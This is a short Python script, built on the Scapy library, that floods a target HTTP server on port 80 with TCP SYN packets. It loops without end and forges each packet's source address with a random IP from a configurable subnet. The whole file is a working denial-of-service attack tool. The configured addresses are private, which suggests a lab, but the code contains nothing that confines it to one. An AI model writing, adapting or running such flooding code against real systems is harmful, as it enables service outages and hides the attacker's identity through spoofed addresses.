#!/usr/bin/env python3
from scapy.all import *
import sys
import ipaddress
import random

# Configuration
TARGET_IP = "10.12.0.10"    # Target IP (HTTP server)
TARGET_PORT = 80             # HTTP port
ATTACKER_IP = "10.1.0.2"     # Your real IP (excluded from spoofing)
SPOOFED_SUBNET = "10.1.0.0/24"  # Subnet to spoof (adjust as needed)

def syn_flood():
    # Generate spoofed IP list (exclude network/broadcast and attacker IP)
    network = ipaddress.IPv4Network(SPOOFED_SUBNET, strict=False)
    ip_list = [str(ip) for ip in network.hosts() if str(ip) != ATTACKER_IP]
    
    print(f"[+] Flooding {TARGET_IP}:{TARGET_PORT} with spoofed IPs from {SPOOFED_SUBNET}")
    print(f"[+] Attacker IP {ATTACKER_IP} excluded from spoofing")
    print("[!] Press Ctrl+C to stop...")

    packet_count = 0
    try:
        while True:
            # Randomize spoofed IP and source port
            spoofed_ip = random.choice(ip_list)
            ip = IP(src=spoofed_ip, dst=TARGET_IP)
            tcp = TCP(sport=random.randint(1024, 65535), dport=TARGET_PORT, flags="S", seq=random.randint(0, 1000000))
            
            # Send packet (verbose=0 for speed)
            send(ip / tcp, verbose=0)
            packet_count += 1
            print(f"\r[+] Packets sent: {packet_count}", end="", flush=True)

    except KeyboardInterrupt:
        print(f"\n[!] Stopped. Total packets sent: {packet_count}")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Error: Run with 'sudo' (raw sockets require root).")
        sys.exit(1)
    syn_flood()